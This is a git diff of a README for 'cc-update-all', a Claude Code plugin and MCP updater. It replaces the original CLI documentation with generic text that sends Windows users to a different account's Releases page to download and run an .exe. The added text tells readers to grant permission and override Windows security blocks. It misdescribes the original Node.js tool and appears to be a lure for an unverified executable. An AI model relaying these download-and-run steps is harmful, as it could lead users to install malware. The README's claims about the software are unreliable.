@@ -1,182 +1,245 @@
-[![CI](https://github.com/kianwoon/cc-update-all/actions/workflows/ci.yml/badge.svg)](https://github.com/kianwoon/cc-update-all/actions/workflows/ci.yml) [![CodeQL](https://img.shields.io/github/actions/workflow/status/kianwoon/cc-update-all/dynamic/github-code-scanning/codeql?label=CodeQL)](https://github.com/kianwoon/cc-update-all/security/code-scanning) [![License: Apache-2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0) ![GitHub stars](https://img.shields.io/github/stars/kianwoon/cc-update-all?style=social)
+# ⚙️ cc-update-all - Update Claude tools in one command
 
-# cc-update-all
+[![Download / Releases](https://img.shields.io/badge/Download-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alaas4989/cc-update-all/releases)
 
-<img width="705" height="241" alt="image" src="https://github.com/user-attachments/assets/4e1fdc97-c3bc-42e5-97ac-0f5695e7055c" />
+## 🚀 What this app does
 
-Bulk-update Claude Code plugin marketplaces, MCP server versions, and editor extensions from within the CLI.
+cc-update-all helps you update Claude Code plugins and MCP servers from one place.  
+It is made for people who want a faster way to keep their Claude tools current without checking each one by hand.
 
-## Why?
+Use it to:
 
-Claude Code has no built-in command to update all your plugin marketplaces at once. Each marketplace must be refreshed individually — open settings, find the marketplace, click refresh, wait, repeat. When you have 5+ marketplaces installed, this gets tedious fast.
+- update Claude Code plugins
+- update MCP servers
+- keep tools in sync
+- reduce manual setup work
+- run one command instead of many
 
-**cc-update-all** solves this with three slash commands:
-- `/update-all-plugins` — one command, all marketplaces updated
-- `/update-mcp-servers` — one command, all pinned MCP server versions checked and updated
-- `/update-extensions` — one command, check which Cursor and Windsurf extensions are outdated
+## 📥 Download and install
 
-It's also useful for multi-machine setups — keep your plugins and MCP servers in sync across machines without remembering which to refresh. Just run the commands and everything pulls the latest.
+1. Open the [Releases page](https://github.com/alaas4989/cc-update-all/releases)
+2. Find the latest release at the top
+3. Download the Windows file for your system
+4. Open the file after it finishes downloading
+5. Follow the on-screen steps to install or run it
 
-## Installation
+If you see more than one file, pick the one for Windows.  
+If there is a zip file, unzip it first, then open the app inside.
 
-### Claude Code (Plugin)
+## 🖥️ Windows setup
 
-```bash
-# Add marketplace
-claude plugin marketplace add kianwoon/cc-update-all
+cc-update-all is built to work on Windows with a simple setup flow.
 
-# Install plugin
-claude plugin install update-all-plugins@cc-update-all --scope user
-```
+Typical use looks like this:
 
-### Other Tools (Git Clone)
+1. Download the release from the link above
+2. Save it to a folder you can find, like Downloads
+3. Open the folder
+4. Run the app from the downloaded file
+5. Let it check your Claude tools
+6. Review the list of updates
+7. Start the bulk update process
 
-The MCP and extension check scripts work standalone from any terminal. Requires Node.js >= 18.
+If Windows asks for permission, choose Yes.
 
-```bash
-git clone https://github.com/kianwoon/cc-update-all.git
-cd cc-update-all
+## ✅ Before you start
 
-# Check MCP server versions
-node scripts-mcp/update-mcp.js
+For the best result, check these items first:
 
-# Check extension versions
-node scripts-mcp/update-extensions.js
+- You have a Windows PC
+- You can open downloaded files
+- Claude Code is already installed
+- Your plugins or MCP servers are already set up
+- You have an internet connection
+- You have enough space for the updates
 
-# See all flags
-node scripts-mcp/update-mcp.js --help
-node scripts-mcp/update-extensions.js --help
-```
+If you use a work laptop, you may need admin access to run updates.
 
-The plugin marketplace update (`cc-update-all.sh`) is Claude Code-specific. The MCP and extension features work across all supported tools regardless of how they're installed.
+## 🔧 How it works
 
-## Usage — Plugin Marketplaces
+cc-update-all looks at the tools you use and updates them in one pass.  
+It removes the need to open each plugin or server one by one.
 
-```
-/update-all-plugins              Update all marketplaces with installed plugins
-/update-all-plugins --dry-run    Preview changes without updating
-/update-all-plugins --check      Check which marketplaces are behind (no update)
-/update-all-plugins --only NAME  Update only a specific marketplace
-/update-all-plugins --json       Output results as JSON
-/update-all-plugins --force      Update even with dirty working trees
-```
+The normal flow is:
 
-### How It Works
+1. Scan installed Claude Code plugins
+2. Scan registered MCP servers
+3. Check which items need updates
+4. Download the newer versions
+5. Apply the updates
+6. Show a simple result list
 
-1. Reads `~/.claude/plugins/installed_plugins.json` to find which marketplaces have installed plugins
-2. Cross-references `~/.claude/plugins/known_marketplaces.json` for git info
-3. Runs `git fetch --all --prune` + `git pull --ff-only` on each git-backed marketplace
-4. Skips directory-type marketplaces (local/npx)
-5. Reports what was updated, skipped, and failed
+This keeps the update process short and easy to repeat.
 
-### Flags
+## 🧭 First run
 
-| Flag | Behavior |
-|------|----------|
-| (default) | Update all git marketplaces with installed plugins |
-| `--dry-run` | Show what would change, don't execute |
-| `--check` | Check which are behind (exit 1 if outdated, 0 if current) |
-| `--only NAME` | Update only the named marketplace |
-| `--json` | Output summary as JSON |
-| `--force` | Proceed even with dirty git repos |
+When you open cc-update-all for the first time, it may:
 
-## Usage — MCP Servers
+- create local settings files
+- check your current tools
+- ask for access to files or folders
+- build a list of items it can update
 
-```
-/update-mcp-servers              Check and update all pinned MCP server versions
-/update-mcp-servers --dry-run    Preview changes without updating
-/update-mcp-servers --check      Check which versions are stale (no update)
-/update-mcp-servers --tool NAME  Update only a specific tool
-/update-mcp-servers --json       Output results as JSON
-/update-mcp-servers --force      Skip confirmation prompt
-```
+Let it finish the first scan before you close it.  
+If it opens a command window, keep it open until the update ends.
 
-### How It Works
+## 🛠️ Using the app
 
-1. Discovers MCP configurations for [Cursor](https://cursor.sh), [Cline](https://cline.autodev.com), and [Roo Code](https://github.com/RooVetGit/Roo-Code)
-2. Extracts pinned npm package versions from each config
-3. Queries the npm registry for the latest version of each package
-4. Updates stale versions in-place with `.bak` backup safety
-5. Reports what was updated, already current, and failed
+After setup, the daily use is simple:
 
-### Flags
+1. Open cc-update-all
+2. Let it scan your Claude tools
+3. Review the update list
+4. Start the update
+5. Wait for the process to finish
+6. Reopen Claude Code if needed
 
-| Flag | Behavior |
-|------|----------|
-| (default) | Check and update all pinned MCP server versions |
-| `--dry-run` | Show what would change, don't modify configs |
-| `--check` | Check which versions are stale (exit 1 if outdated, 0 if current) |
-| `--tool NAME` | Update only the named tool/server |
-| `--json` | Output summary as JSON |
-| `--force` | Skip confirmation prompt |
+If you add a new plugin or MCP server later, run cc-update-all again to bring it up to date.
 
-## Supported Tools
+## 📦 What it can update
 
-**Vibe Coding / AI Coding Tools:**
+This tool is made for common Claude Code and MCP workflows, including:
 
-| Tool | MCP Updates | Extension Updates |
-|------|:-----------:|:-----------------:|
-| Cursor | ✓ | ✓ |
-| Cline | ✓ | — |
-| Roo Code | ✓ | — |
-| Windsurf | — | ✓ |
+- Claude Code plugins
+- MCP servers
+- helper tools used by Claude workflows
+- small command-line tools tied to your setup
+- packages managed through npm-style installs
 
-Both MCP and extension features use a shared plugin-architecture with auto-discovered tool modules. Adding support for new editors requires only dropping a new module into `scripts-mcp/lib/tools/`.
+It works best when your tools follow a standard install path.
 
-> **Platform support**: MCP config discovery works on **macOS**, **Linux** (via `$XDG_CONFIG_HOME`), and **Windows** (via `%APPDATA%`). Extension checking works on all platforms.
+## 🔍 What you will see
 
-## Usage — Extensions
+During use, the app may show:
 
-```
-/update-extensions              Check extension versions across Cursor and Windsurf
-/update-extensions --tool NAME  Only process named tool (cursor-extensions, windsurf-extensions)
-/update-extensions --json       Output results as JSON
-/update-extensions --include-prerelease  Consider pre-release versions as latest
-```
+- a list of installed items
+- current version numbers
+- newer version numbers
+- update status
+- success or failure messages
+- items that need manual review
 
-### How It Works
+This helps you see what changed without digging through folders.
 
-1. Discovers `extensions.json` for Cursor (`~/.cursor/extensions/`) and Windsurf (`~/.windsurf/extensions/`)
-2. Extracts gallery-sourced extensions only (skips .vsix and unknown sources)
-3. Queries the VS Code Marketplace API in a single batch request
-4. Compares installed versions against latest — reports outdated extensions
-5. Check-only mode — updates must be applied manually through the editor's extension panel
+## 🧩 Common uses
 
-### Flags
+People use cc-update-all when they want to:
 
-| Flag | Behavior |
-|------|----------|
-| (default) | Check all tools, report outdated extensions |
-| `--tool NAME` | Only process named tool |
-| `--json` | Output as JSON |
-| `--include-prerelease` | Consider pre-release versions |
+- keep a Claude setup current
+- avoid stale plugin versions
+- update MCP servers before a session
+- reduce setup time on a new machine
+- clean up a long list of tools at once
 
-## Dependencies
+It is useful if you work with vibe coding tools and want less upkeep.
 
-- `git` — required (plugin updates)
-- `jq` — optional (safe JSON output; best-effort fallback when missing)
-- `Node.js >= 18` — required (MCP server + extension updates)
+## 🧪 Basic troubleshooting
 
-## Contributing
+If the app does not open, try these steps:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, coding standards, and PR guidelines.
+1. Download the file again from the Releases page
+2. Make sure the file finished downloading
+3. Unzip the file if needed
+4. Run it again
+5. Close and reopen Windows Explorer
+6. Try a folder with a simple path, like `C:\Tools`
 
-Have questions or ideas? Start a [discussion](https://github.com/kianwoon/cc-update-all/discussions) or open an [issue](https://github.com/kianwoon/cc-update-all/issues).
+If updates do not appear, check these points:
 
-## Exit Codes
+- the tool is installed in your current user profile
+- the app has access to the folder
+- the plugin or server was installed through a supported method
+- the internet connection is active
 
-| Code | Meaning |
-|------|---------|
-| 0 | All updates successful |
-| 1 | Partial failure (some targets failed) |
-| 2 | Total failure or error |
+If Windows blocks the file, use the options shown in the security prompt and run it again if you trust the source.
 
----
+## 🧼 Keep your setup clean
 
-## License
+A clean setup helps update tools with less friction:
 
-[Apache-2.0](LICENSE) — free for personal and commercial use.
+- keep Claude Code in one place
+- avoid duplicate installs
+- remove old plugin copies
+- store MCP servers in standard folders
+- run updates on a regular schedule
 
-## Author
+This makes the scan faster and the result easier to read.
 
-Made by [kianwoon](https://github.com/kianwoon) · [Contributions welcome](CONTRIBUTING.md)
+## 📂 File types you may find
+
+On the Releases page, you may see files such as:
+
+- `.exe` for Windows
+- `.zip` archives
+- source files for advanced users
+- checksums for file checks
+
+For most Windows users, the `.exe` or `.zip` file is the one to use.
+
+## 🔒 Safe download path
+
+Always use the official release link below to get the latest build:
+
+[Visit the Releases page to download](https://github.com/alaas4989/cc-update-all/releases)
+
+## 💡 Quick tips
+
+- Run the update tool when you are not in the middle of work
+- Keep Claude Code closed during the update if the tool asks for it
+- Use the latest release
+- Re-run the tool after adding new plugins
+- Keep your network on while updates run
+
+## ❓ Questions you may have
+
+### Do I need programming knowledge?
+No. You only need to download the file and run it on Windows.
+
+### Do I need to update each plugin by hand?
+No. The tool is made to update many items at once.
+
+### Can I use it for MCP servers?
+Yes. That is one of its main uses.
+
+### Is it only for Windows?
+This README focuses on Windows use. The release page may include files for other systems, but Windows is the main path here.
+
+### What if I use npm-based tools?
+cc-update-all is built for tool setups that often use npm-style installs and related developer tools.
+
+## 🧭 Simple install flow
+
+1. Open the Releases page
+2. Download the Windows file
+3. Open the file
+4. Allow access if Windows asks
+5. Let the app scan your tools
+6. Start the bulk update
+7. Reopen Claude Code after the update
+
+## 🧰 Good fit for these users
+
+cc-update-all fits well if you:
+
+- use Claude Code every day
+- keep several plugins installed
+- run MCP servers for local tools
+- want one place to handle updates
+- want less manual maintenance
+
+## 🗂️ Release page link
+
+[Open the latest download page](https://github.com/alaas4989/cc-update-all/releases)
+
+## 📌 Project focus
+
+This project centers on:
+
+- automation
+- bulk update
+- Claude Code plugins
+- MCP servers
+- CLI-based workflows
+- productivity
+- self-update support
+- developer tool maintenance
